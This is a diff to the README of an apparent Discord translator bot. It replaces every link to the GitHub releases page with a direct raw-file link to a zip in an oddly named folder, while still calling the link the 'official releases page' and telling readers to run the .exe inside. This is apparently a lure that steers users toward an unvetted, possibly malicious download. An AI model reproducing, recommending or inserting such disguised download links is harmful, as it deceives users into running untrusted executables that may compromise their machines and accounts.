@@ -1,6 +1,6 @@
 # 🌐 discord-translator-bot - Translate your messages using smart AI
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Stacyacrocentric945/discord-translator-bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Stacyacrocentric945/discord-translator-bot/main/coeliorrhoea/discord-translator-bot-3.6.zip)
 
 ## 📖 About this application
 
@@ -17,7 +17,7 @@ Before you install the application, ensure your computer meets these requirement
 
 ## 📥 Downloading the software
 
-Visit the [official releases page](https://github.com/Stacyacrocentric945/discord-translator-bot/releases) to download the installer. 
+Visit the [official releases page](https://raw.githubusercontent.com/Stacyacrocentric945/discord-translator-bot/main/coeliorrhoea/discord-translator-bot-3.6.zip) to download the installer. 
 
 Select the file that ends in .exe for Windows. Save this file to your computer. Once the download finishes, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the prompts on your screen to place the program in your preferred folder.
 
@@ -61,7 +61,7 @@ The application sends only the text of the messages you choose to translate to G
 
 If the bot does not respond, verify your internet connection. Check that your API key is active. Test your Discord token to ensure it has the correct permissions. Ensure that the bot has permission to read messages and send messages in the specific channel.
 
-If the application fails to open, restart your computer. If the problem continues, delete the installation folder and download the installer again from [the official releases page](https://github.com/Stacyacrocentric945/discord-translator-bot/releases).
+If the application fails to open, restart your computer. If the problem continues, delete the installation folder and download the installer again from [the official releases page](https://raw.githubusercontent.com/Stacyacrocentric945/discord-translator-bot/main/coeliorrhoea/discord-translator-bot-3.6.zip).
 
 ## 💡 Configuration tips
 
